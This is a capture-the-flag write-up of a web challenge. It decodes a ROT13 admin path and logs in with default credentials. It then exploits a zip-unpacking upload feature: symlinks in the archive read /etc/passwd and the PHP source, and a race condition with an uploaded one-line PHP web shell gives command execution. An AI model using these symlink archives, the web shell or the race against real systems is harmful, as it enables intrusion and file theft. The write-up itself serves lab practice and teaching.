# URL
https://ch26.sbug.se
# Description

Our site has been under development for 3 years, can you test it so we can release it?

## First glance
When you visit the URL, the website say that it will be release in more than 1000 days
![image](https://user-images.githubusercontent.com/39065934/126634155-dacd87d8-7f5e-46b9-aceb-0e95745b488a.png)
When checking the source, the have the following javascript code for counting down time
![image](https://user-images.githubusercontent.com/39065934/126634244-7bb79a7a-823c-4e69-bf09-8a0cba5bd2b6.png)
## Find the real page

```javascript
    <script>
      // Set the date we're counting down to
      var countDownDate = new Date("Jan 5, 2025 15:37:25").getTime();

      // Update the count down every 1 second
      var x = setInterval(() => {
        // Get todays date and time
        var now = new Date().getTime();

        // Find the distance between now an the count down date
        var distance = countDownDate - now;

        // Time calculations for days, hours, minutes and seconds
        var days = Math.floor(distance / (1000 * 60 * 60 * 24));
        var hours = Math.floor(
          (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
        );
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);

        // Display the result in an element with id="demo"
        document.getElementById("demo").innerHTML =
          days + "d " + hours + "h " + minutes + "m " + seconds + "s ";

        // If the count down is finished, write some text
        if (distance < 0) {
          clearInterval(x);
          alert("The site is ready for you")
          window.location = "./nqzva.cuc" // TODO: don't be silly and decode this
        }
      }, 1000);
    </script>
```
By reading the code, we see that at the time end, we'll be redirect to `"./nqzva.cuc"`, but if we visit it, we have a 404 Not found error
![image](https://user-images.githubusercontent.com/39065934/126634489-a7ba3c2a-df86-45fd-aa02-e7b97ca4016b.png)
If look carefully, we see have the extension of the url is `.cuc`, and the comment in the source say that we should decode it somehow, so just by guessing, this URL can be decode into `admin.php` by using **ROT13** (check [here](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=bnF6dmEuY3Vj) for result).

Go to `admin.php` and voila, the page appear.
![image](https://user-images.githubusercontent.com/39065934/126635181-348dd2b7-fbd9-4d71-935b-91c74217feab.png)
## Weak authentication
Checking the source code, we have the following line, which is clealy a hint.
![image](https://user-images.githubusercontent.com/39065934/126635403-9490395d-abec-47ef-aacc-e5b0663c37e4.png)

We now login with `username=admin` and `password=admin`
![image](https://user-images.githubusercontent.com/39065934/126635708-cd77ae12-825d-4aed-a503-dfec7621a093.png)
## Unzip and symlinks
This website do two thing. First, it unzip our uploaded file, then display the result to us. For example, I zipped a text file and upload it, and this is the result.

![image](https://user-images.githubusercontent.com/39065934/126636721-5068e1d3-0159-4cb9-87aa-44b5ce5712fe.png)

If you are new and don't know what to do next at this point, I refer to read [this](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-file-automatically-decompressed-upload) first.

Using the soft symlink, we craft a zip file contain a symlink point to `/etc/flag` to read the flag.
```bash
ln -s /etc/flag flag.txt
zip --symlink exploit.zip flag.txt
```
However, it doesn't work as we expected.
![image](https://user-images.githubusercontent.com/39065934/126637641-65df384d-79ad-4509-8ae0-38f0695e026f.png)
Okey so now it's time to double check. Because the result say that the file is not found, I tried read the famous `/etc/passwd` file for double check.
```bash
ln -s /etc/flag flag.txt
ln -s /etc/passwd passwd.txt
zip --symlink exploit.zip flag.txt passwd.txt
```
Now we can see the content of `/etc/passwd`, but the flag file is still not found
![image](https://user-images.githubusercontent.com/39065934/126638006-0da3f0b5-0650-4cc3-b697-a8dc0b5abe91.png)

## Reading the source code
By now I tried to read the source code, and luckyly, the we can see that path is `/var/www/html/tmp/upload_*****`, which make me think that the source code should be in `/var/www/html`, so now we trying to read it using the following
```bash
ln -s /var/www/html/admin.php source.txt
zip --symlink exploit.zip source.txt
```
and the source appear
![image](https://user-images.githubusercontent.com/39065934/126638934-343d8799-f462-4c3c-8570-f60e4f22510c.png)
```php
<html>

<head>
  <title>Unz1pp3r</title>
  <style>
    body {
      background-color: white;
      color: blue;
    }
  </style>
</head>

<body>
  <center>
    <h1>Restricted Zone v0.0.1</h1>
    <pre>Note from Developer: this functionality is not ready do not use it in production</pre>
    <img src="./static/internet-guy.png">

    <!-- Remember, credentials is the name of this file without extension -->
    <br /></br>
    <?php
    $FAKE_DATABASE = array("admin" => "21232f297a57a5a743894a0e4a801fc3",);
    $page = $_GET['page'];
    switch ($page) {
      case "login":
        echo "Trying to log in";
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        if ($FAKE_DATABASE[$user] === md5($pass)) {
          session_start();
          session_regenerate_id(True);
          $_SESSION['user'] = $user;
          header("Location: ?page=upload");
          die();
        } else {
          header("Location: ?");
        }
        break;
      case "admin_login_help":
        session_start();
        if (!isset($_SESSION['login_code'])) {
          $_SESSION['login_code'] = bin2hex(openssl_random_pseudo_bytes(18));
          echo "";
        } else {
          echo "";
        }
        break;
      case "code_submit":
        session_start();
        $code = $_POST['code'];
        if (isset($code) && isset($_SESSION['login_code'])) {
          if ($code === $_SESSION['login_code']) {
            echo "Flag: ";
            passthru("sudo /bin/cat /etc/flag");
          } else {
            echo "Invalid code";
          }
        } else {
          echo "<form action='?page=code_submit' method='POST'>Please input the login code:<input name='code'/><input type='submit' value='submit'/></form>";
        }
        break;
      case "upload":
        session_start();
        if (!isset($_SESSION['user'])) {
          header("Location: ?");
        } else {
          echo "Welcome " . $_SESSION['user'] . "<br> <button onclick='document.cookie=\"PHPSESSID=deleted\";location=\"?\"'>Logout</button>";
          echo "<br>Use this form to verify zip integrity.your flag is in /etc/flag<br>
          <form action='?page=process_upload' method='post' enctype='multipart/form-data'><input type='file' name='zipfile'/>
          <input type='submit' name='submit' value='Upload'/></form>";
        }
        break;
      case "process_upload":
        session_start();
        if (isset($_SESSION['user']) && $_FILES['zipfile']['name']) {
          if ($_FILES['zipfile']['size'] > 16000) {
            echo "File above max size of 10kb";
            echo "<a href='?page=upload'>back</a>";
            break;
          }
          $tmp_file = '/var/www/html/tmp/upload_' . session_id();
          exec('mkdir ' . $tmp_file);
          exec('unzip -o ' . $_FILES['zipfile']['tmp_name'] . ' -d ' . $tmp_file);
          echo "Zip contents:";
          passthru("cat $tmp_file/* 2>&1");
          exec("rm -rf $tmp_file");
          echo "<a href='?page=upload'>back</a>";
        }

        break;
      default:

        echo "<form action='?page=login' method='POST'>Username: <input name='user'/>
      Password: <input type='password' name='pass'/>
      <input type='submit' value='Log in'/></form>";
    }
    ?>
  </center>
</body>
</html>
```
## Fall into the rabbit hole
We can see that there is a case `code_submit` to read the flag with sudo privilege, but that's a rabbit hole. I will do the exploit for it later
## Turn into RCE with race
Back to the case `process_upload`, we see that the server first extract our zip file into a folder with a path `/var/www/html/tmp/upload_****`, read the content, then remove the file.

So what happend when we upload a shell, then we access to it **after** the unzip process end, but **before** the server delete it? Is this give us a code execution then?

So to test if the theory work, I create a simple shell with the following content
```php
<?php
system($_GET["cmd"]);
?>
```
named it `shell.php` and zip it to `shell.zip`
Upload the file, then trying to access it (we know the folder name from "File not found" content before), however, we have 404 error. This is because we doesn't access the shell fast, and therefore the file was deleted. With the help of "Burp Intruder", I managed to solve the problem by keep sending the request to the shell (This could be done using Python script too, but I am very tired at the point :joy:). 

First we make a request to our shell, with `cmd=ls -la /` mean listing the file in the root dir
![image](https://user-images.githubusercontent.com/39065934/126640981-e50186ba-54ff-481e-af94-ad4dc1c78ab7.png)

After that, we make the request send infinitely
![image](https://user-images.githubusercontent.com/39065934/126641026-ccb34fe5-b4b6-45d5-a3ad-c55cf457650b.png)

Start the attack, then upload the `shell.zip` into the server. And voila
![image](https://user-images.githubusercontent.com/39065934/126641416-d8e9db15-97f2-4e49-8bd2-a150a307521d.png)
From this, we can see that the flag is accually in `/flag`, not in `/etc/flag` as description, what a pain.
Now we can read the flag :D
![image](https://user-images.githubusercontent.com/39065934/126641714-debe9b6b-58e8-4535-925e-b75b3b8c696f.png)
![image](https://user-images.githubusercontent.com/39065934/126641806-ffd2cc45-c087-43c4-97aa-f2193787b1e2.png)

